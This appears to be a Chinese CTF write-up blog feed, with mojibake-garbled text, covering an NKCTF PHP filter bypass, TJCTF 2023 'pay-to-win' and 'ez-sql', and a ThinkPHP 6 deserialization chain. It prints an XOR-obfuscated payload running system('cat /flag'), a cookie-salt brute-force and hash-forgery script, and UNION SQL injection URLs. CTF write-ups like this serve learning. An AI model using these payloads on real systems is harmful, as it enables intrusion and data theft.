<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=114514E13</span><br></pre></td></tr></table></figure>

<p>intval()å‡½æ•°ä¸ä¼šè¯»å–Eåé¢çš„å€¼ï¼Œç»è¿‡intval()å‡½æ•°å¤„ç†åå°±ç­‰äº114514</p>
<p>ç¬¬å››ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>éœ€è¦å­˜åœ¨NS_CTF.goï¼Œä½†æ˜¯ä¼ å…¥çš„å‚æ•°åä¸­ç‚¹<code>.</code>å’Œ<code>ç©ºæ ¼</code>éƒ½è¢«æ›¿æ¢ä¸ºäº†ä¸‹åˆ’çº¿<code>_</code></p>
<p>æ‰€ä»¥ç›´æ¥ä¼ å‚NS_CTF.goå¹¶ä¸èƒ½è¡Œ</p>
<p>æœç´¢å‘ç°å½“<code>PHPç‰ˆæœ¬å°äº8</code>æ—¶ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·<code>[</code>ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œç„¶åå› ä¸ºå‡ºé”™ï¼Œç‚¹<code>.</code>å°±ä¸ä¼šå˜æˆä¸‹åˆ’çº¿<code>_</code></p>
<p>ç¬¬äº”ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>ä¸èƒ½å­˜åœ¨æ•°å­—å’Œå­—æ¯</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);&amp;_=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸‹æ‘†å‡ºèƒ½ç”Ÿæˆå¼‚æˆ–æŸ¥è¯¢è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">input</span>(<span class="string">&quot;Input key:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        result=i^j</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">chr</span>(result) <span class="keyword">is</span> key ):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;(&quot;&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;&quot;^&quot;&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;&quot;)==&#x27;</span>+<span class="built_in">chr</span>(result)+<span class="string">&#x27;   chr(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)^chr(&#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27;)==&#x27;</span>+<span class="built_in">chr</span>(result))</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚</p>
<p><img src="/2023/03/29/nkctf%20web/image-20230410215740449.png" alt="image-20230410215740449"></p>
]]></content>
  </entry>
  <entry>
    <title>TJCTF 2023</title>
    <url>/2023/05/30/pay-to-win(TJCTF%202023)/</url>
    <content><![CDATA[<p>pay-to-win      ez-sql</p>
<span id="more"></span>

<meta name="referrer" content="no-referrer">

<h3 id="pay-to-win"><a href="#pay-to-win" class="headerlink" title="pay-to-win"></a>pay-to-win</h3><p>ç»™äº†æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">//app.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="built_in">bytes</span>(data, <span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.cookies.get(<span class="string">&#x27;data&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> request.cookies.get(<span class="string">&#x27;hash&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.cookies.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    decoded = b64decode(data)</span><br><span class="line">    data_hash = request.cookies.get(<span class="string">&#x27;hash&#x27;</span>)</span><br><span class="line">    payload = json.loads(decoded)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        resp = make_response(redirect(<span class="string">&#x27;/login&#x27;</span>))</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    actual_hash = <span class="built_in">hash</span>(data + users[payload[<span class="string">&#x27;username&#x27;</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data_hash != actual_hash:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload[<span class="string">&#x27;user_type&#x27;</span>] == <span class="string">&#x27;premium&#x27;</span>:</span><br><span class="line">        theme_name = request.args.get(<span class="string">&#x27;theme&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;static/premium.css&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;premium.jinja&#x27;</span>, theme_to_use=<span class="built_in">open</span>(theme_name).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;basic.jinja&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_login</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.jinja&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">        users[username] = <span class="built_in">hex</span>(random.getrandbits(<span class="number">24</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    resp = make_response(redirect(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;user_type&quot;</span>: <span class="string">&quot;basic&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    b64data = b64encode(json.dumps(data).encode())</span><br><span class="line">    data_hash = <span class="built_in">hash</span>(b64data.decode() + users[username])</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;data&#x27;</span>, b64data)</span><br><span class="line">    resp.set_cookie(<span class="string">&#x27;hash&#x27;</span>, data_hash)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªdockeræ–‡ä»¶</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530104900654.png" alt="image-20230530104900654"></p>
<p>å¯ä»¥çŸ¥é“flagå­˜åœ¨äº&#x2F;secret-flag-dir&#x2F;flag.txtä¸­</p>
<p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹æºç </p>
<p>æœ‰ä¸¤ä¸ªè·¯ç”±ï¼Œå…ˆçœ‹æ ¹è·¯ç”±</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530105024536.png" alt="image-20230530105024536"></p>
<p>çœ‹åˆ°è¿™ä¸ªè·¯ç”±æœ€ä¸‹é¢å¯ä»¥æ‰“å¼€æ–‡ä»¶å¹¶è¯»å–ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªåˆ©ç”¨ç‚¹ï¼Œæ¥ç€çœ‹æ€æ ·å¯ä»¥åˆ°è¾¾è¿™ä¸ªï¼Œéœ€è¦è®©<code>payload[&#39;user_type&#39;] == &#39;premium&#39;:</code>ï¼Œä½†æ˜¯ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªifï¼Œéœ€è¦<code>data_hash == actual_hash</code>ï¼Œactual_hashæ˜¯ç»è¿‡<code>hash(data + users[payload[&#39;username&#39;]])</code>äº§ç”Ÿçš„ï¼Œ<code>users[payload[&#39;username&#39;]]</code>æ˜¯ç”¨æˆ·é¦–æ¬¡ç™»å½•åœ¨&#x2F;loginè·¯ç”±ä¸‹äº§ç”Ÿçš„å”¯ä¸€æ ‡è¯†ï¼Œdata_hashæ˜¯<code>cookie</code>ä¸­çš„<code>hash</code></p>
<p>å†çœ‹&#x2F;loginè·¯ç”±</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530105451727.png" alt="image-20230530105451727"></p>
<p>ç™»å½•çš„æ—¶å€™å…ˆä¼šæ£€æŸ¥æ˜¯ä¸æ˜¯é¦–æ¬¡ç™»å½•ï¼Œå¦‚æœæ˜¯å°±ä¼šä½¿ç”¨<code>users[username] = hex(random.getrandbits(24))[2:]</code>è¿”å›ä¸€ä¸ªç›¸å½“äºç”¨æˆ·æ ‡è¯†çš„ä¸œè¥¿ï¼Œè¿™ä¸ªæ ‡è¯†åœ¨å†æ¬¡ç™»å½•æ—¶æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œç„¶åå°±æ˜¯<code>data_hash = hash(b64data.decode() + users[username])</code>ï¼Œç»è¿‡è‡ªå®šä¹‰å‡½æ•°hashå¤„ç†åä¼ åˆ°cookieçš„hashä¸­</p>
<p>ä¸ºäº†æ»¡è¶³<code>data_hash == actual_hash</code>ï¼Œéœ€è¦å…ˆè·å¾—é¦–æ¬¡ç™»å½•äº§ç”Ÿçš„ç”¨æˆ·å”¯ä¸€æ ‡è¯†<code>users[username] = hex(random.getrandbits(24))[2:]</code></p>
<p>å…ˆç™»å½•admin</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110126686.png" alt="image-20230530110126686"></p>
<p>åœ¨cookieå¤„äº§ç”Ÿäº†</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110150875.png" alt="image-20230530110150875"></p>
<p>å°†dataè§£ç åæ˜¯</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110215086.png" alt="image-20230530110215086"></p>
<p>å…ˆå°†user_typeä¿®æ”¹æˆpremiumï¼Œç„¶åç¼–ç ï¼Œæ›¿æ¢æ‰dataç„¶åå°±æ˜¯æ„é€ hash</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="built_in">bytes</span>(data, <span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">b64data = <span class="string">&#x27;eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJ1c2VyX3R5cGUiOiAiYmFzaWMifQ==&#x27;</span></span><br><span class="line">data_hash = <span class="string">&#x27;1af835e5354b1eabb67dfe7df8818f7377f4c83066de39ad3187fd8035f84cb7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>**<span class="number">3</span>):     //éå†å¯»æ‰¾ç”¨æˆ·æ ‡è¯†</span><br><span class="line">    users_hoge = <span class="built_in">hex</span>(r)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line">    h = <span class="built_in">hash</span>(b64data + users_hoge)</span><br><span class="line">    <span class="keyword">if</span> h == data_hash:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">b64data=<span class="string">&quot;eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJ1c2VyX3R5cGUiOiAicHJlbWl1bSJ9&quot;</span>  //&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;user_type&quot;</span>: <span class="string">&quot;premium&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">data_hash = <span class="built_in">hash</span>(b64data + users_hoge)</span><br><span class="line"><span class="built_in">print</span>(data_hash)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¾“å‡º</span><br><span class="line">e06f4cccf758cff90978f82555e0424877e9ecf7d2adc79cfd75fdb8d9b02968</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢hashååˆ·æ–°</p>
<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110725892.png" alt="image-20230530110725892"></p>
<p>æœ€å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://pay-to-win.tjc.tf/?theme=/secret-flag-dir/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/30/pay-to-win(TJCTF%202023)/image-20230530110800110.png" alt="image-20230530110800110"></p>
<h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez-sql"></a>ez-sql</h3><p>æºç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> sqlite3 = <span class="built_in">require</span>(<span class="string">&#x27;sqlite3&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> uuid = <span class="built_in">require</span>(<span class="string">&#x27;uuid&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; parse &#125; = <span class="built_in">require</span>(<span class="string">&#x27;csv-parse&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./flag.txt&#x27;</span>, &#123; <span class="attr">encoding</span>: <span class="string">&#x27;utf8&#x27;</span> &#125;).<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> db = <span class="keyword">new</span> sqlite3.<span class="title class_">Database</span>(<span class="string">&#x27;:memory:&#x27;</span>);</span><br><span class="line"></span><br><span class="line">db.<span class="title function_">serialize</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    db.<span class="title function_">run</span>(<span class="string">&#x27;CREATE TABLE jokes (id INTEGER PRIMARY KEY, joke TEXT)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> stmt = db.<span class="title function_">prepare</span>(<span class="string">&#x27;INSERT INTO jokes (id, joke) VALUES (?, ?)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// jokes from https://github.com/amoudgl/short-jokes-dataset/blob/master/data/reddit-cleanjokes.csv</span></span><br><span class="line">    fs.<span class="title function_">createReadStream</span>(<span class="string">&#x27;./reddit-cleanjokes.csv&#x27;</span>).<span class="title function_">pipe</span>(<span class="title function_">parse</span>(&#123; <span class="attr">delimiter</span>: <span class="string">&#x27;,&#x27;</span> &#125;)).<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">row</span>) =&gt;</span> &#123;</span><br><span class="line">        stmt.<span class="title function_">run</span>(row[<span class="number">0</span>], row[<span class="number">1</span>]);</span><br><span class="line">    &#125;).<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        stmt.<span class="title function_">finalize</span>();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> flagTable = <span class="string">`flag_<span class="subst">$&#123;uuid.v4().replace(/-/g, <span class="string">&#x27;_&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">    db.<span class="title function_">run</span>(<span class="string">`CREATE TABLE IF NOT EXISTS <span class="subst">$&#123;flagTable&#125;</span> (flag TEXT)`</span>);</span><br><span class="line"></span><br><span class="line">    db.<span class="title function_">run</span>(<span class="string">`INSERT INTO <span class="subst">$&#123;flagTable&#125;</span> (flag) VALUES (&#x27;<span class="subst">$&#123;flag&#125;</span>&#x27;)`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/search&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; name &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!name) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">err</span>: <span class="string">&#x27;Bad request&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name.<span class="property">length</span> &gt; <span class="number">6</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(&#123; <span class="attr">err</span>: <span class="string">&#x27;Bad request&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    db.<span class="title function_">all</span>(<span class="string">`SELECT * FROM jokes WHERE joke LIKE &#x27;%<span class="subst">$&#123;name&#125;</span>%&#x27;`</span>, <span class="function">(<span class="params">err, rows</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">message</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal server error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(rows);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server is running on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>![image-20230530171123411](pay-to-win(TJCTF 2023)&#x2F;image-20230530171123411.png)</p>
<p>è¿™é‡Œçš„å¤§æ¦‚æ„æ€æ˜¯åˆ›å»ºä¸€ä¸ªsqlite3æ•°æ®åº“å¯¹è±¡ï¼Œåˆåœ¨å…¶ä¸­åˆ›å»ºäº†jokesè¡¨ï¼Œå…¶ä¸­æœ‰idå’Œjokeä¸¤ä¸ªåˆ—ï¼Œé€šè¿‡<code>fs.createReadStream</code>å°†æ–‡æ®µå­˜å…¥è¡¨ä¸­</p>
<p>ç„¶ååˆåˆ›å»ºäº†å­˜æœ‰flagçš„è¡¨ï¼Œä½†æ˜¯è¡¨åæ˜¯é€šè¿‡uuid.v4()å‡½æ•°äº§ç”Ÿçš„ï¼Œç›®å‰æœªçŸ¥åç§°ï¼Œåœ¨è¿™ä¸ªè¡¨ä¸­æœ‰ä¸€ä¸ªåä¸ºflagçš„åˆ—</p>
<p>æ¥ä¸‹æ¥çœ‹è·¯ç”±</p>
<p>![image-20230530171452318](pay-to-win(TJCTF 2023)&#x2F;image-20230530171452318.png)</p>
<p>è¿™ä¸ªè·¯ç”±å¯ä»¥è¯»å–è¡¨ä¸­çš„æ•°æ®ï¼Œä½†æ˜¯å¯¹å¯æ§çš„nameè¿›è¡Œäº†é•¿åº¦é™åˆ¶ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡æ•°ç»„æ¥ç»•è¿‡ï¼Œç„¶åä½¿ç”¨unionè”åˆæŸ¥è¯¢å¾—åˆ°è¡¨åç§°å³å¯è·å¾—flag</p>
<p>ä½†æ˜¯è¡¨åæ˜¯ä¸€ä¸ªæœªçŸ¥çš„</p>
<p>æŸ¥è¯¢èµ„æ–™çœ‹åˆ°</p>
<p>![image-20230530171834905](pay-to-win(TJCTF 2023)&#x2F;image-20230530171834905.png)</p>
<p>å­˜æœ‰flagæ­£æ˜¯ä¸€ä¸ªè‡ªå»ºè¡¨</p>
<p>ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ez-sql-4db84472ca9db26a.tjc.tf/search?name[]=11&#x27; union select 1,name from sqlite_master where type=&#x27;table&#x27; order by name--</span><br></pre></td></tr></table></figure>

<p>![image-20230530172107305](pay-to-win(TJCTF 2023)&#x2F;image-20230530172107305.png)</p>
<p>å›æ˜¾äº†è¡¨å</p>
<p>æ¥ä¸‹æ¥ç›´æ¥è¯»å–è¡¨ä¸­çš„flagå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ez-sql-4db84472ca9db26a.tjc.tf/search?name[]=11&#x27; union select 1,flag from flag_b1af377e_0ac5_46cd_8889_fea243615ec9--</span><br></pre></td></tr></table></figure>

<p>![image-20230530172147626](pay-to-win(TJCTF 2023)&#x2F;image-20230530172147626.png)</p>
]]></content>
  </entry>
  <entry>
    <title>buuctfçš„éƒ¨åˆ†è§£é¢˜</title>
    <url>/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>tpååºåˆ—åŒ–æ¼æ´</p>
<span id="more"></span>

<h3 id="tp6"><a href="#tp6" class="headerlink" title="tp6"></a>tp6</h3><p>é“¾å­ï¼š__destruct()â€”â€”&gt;save()â€”â€”&gt;updateData()â€”â€”&gt;checkAllowFields()â€”â€”&gt;db()â€”â€”&gt;$this-&gt;table . $this-&gt;suffixï¼ˆå­—ç¬¦ä¸²æ‹¼æ¥ï¼‰â€”â€”&gt;toString()</p>
<p>$this-&gt;exists &#x3D; true;<br>$this-&gt;$lazySave &#x3D; true;<br>$this-&gt;$withEvent &#x3D; false;</p>
<p>__destruct()åˆ°save()</p>
<p>è®©lazySaveä¸ºçœŸ</p>
<p>save()åˆ°updateData()</p>
<p>éœ€è¦å…ˆè¿›å…¥åˆ°isEmpty()è®©dataä¸ä¸ºç©ºï¼Œå†è¿›å…¥trigger()è®©withEventä¸ºfalse</p>
<p>updateData()åˆ°getChangedData()</p>
<p>è®©forceä¸ºtrue</p>
<p>$data ä¸ºéç©º</p>
<p>getChangedData()ç»§ç»­åˆ°checkAllowFields()</p>
<p>$fieldå’Œ$schema ä¸ºç©º</p>
<p>db()åˆ°__toString()</p>
<p>__toString()åˆ°toJson()åˆ°toArray()</p>
<p>toArray()åˆ°getAttr()</p>
<p>$keyçš„å€¼ä¼ åˆ°getData()</p>
<p>getAttr()åˆ°getData()</p>
<p>ä¼ å…¥çš„å€¼ä¸ä¸ºç©º</p>
<p>getData()åˆ°getRealFieldName()</p>
<p>å½“$this-&gt;strictä¸ºtrueæ—¶ç›´æ¥è¿”å›$nameï¼Œå³$key</p>
<p>å›åˆ°getData()ï¼Œæ­¤æ—¶$fieldName &#x3D; $key</p>
<p>è¿”å›$this-&gt;data[$fielName]ä¹Ÿå°±æ˜¯$this-&gt;data[$key]ï¼Œè®°ä¸º$value</p>
<p>ä»getData()å†å›åˆ°getAttr()å†åˆ°getValue()</p>
<h3 id="tp6-0"><a href="#tp6-0" class="headerlink" title="tp6.0"></a>tp6.0</h3><p>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.phpï¼Œçœ‹save()å‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153429066.png" alt="image-20230303153429066"></p>
<p>è·Ÿè¿›write()å‡½æ•°</p>
<p>åœ¨vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.phpä¸­</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153728183.png" alt="image-20230303153728183"></p>
<p>è°ƒç”¨äº†<strong>writeFile</strong>å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›</p>
<p>åœ¨<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</strong>ä¸­</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303153827729.png" alt="image-20230303153827729"></p>
<p>çœ‹åˆ°<strong>file_put_contents</strong>å‡½æ•°ï¼Œèƒ½å†™å…¥æ–‡ä»¶</p>
<p>ç”±æ­¤å€’æ¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents($path,$content,LOCK_EX)ä¸­çš„å‚æ•°$path,$contentæ¥æºäºwriteFile($path,$data)</span><br><span class="line"></span><br><span class="line">writeFile($path,$data)ä¸­çš„å‚æ•°$path,$dataæ¥æºäºwrite(String $sessID,String $sessData)</span><br><span class="line"></span><br><span class="line">write(String $sessID,String $sessData)ä¸­çš„å‚æ•°$sessID,$sessDataæ¥æºäºsave()ä¸­è°ƒç”¨äº†write()</span><br></pre></td></tr></table></figure>

<p>åœ¨saveå‡½æ•°ä¸­æœ‰**getId()**å‡½æ•°ï¼Œè·Ÿè¿›ï¼Œè¿˜æœ‰ä¸€ä¸ªsetIdå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303154636521.png" alt="image-20230303154636521"></p>
<p>ç»“åˆå‘ç°ï¼Œå½“ä¼ å…¥çš„idå€¼é•¿åº¦ä¸º32æ—¶ï¼Œåˆ›å»ºsessionIdï¼Œç„¶åè¿›è¡ŒgitId()</p>
<p>å¯»æ‰¾è°ƒç”¨<strong>setID</strong>çš„åœ°æ–¹ï¼Œåœ¨<strong>vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</strong></p>
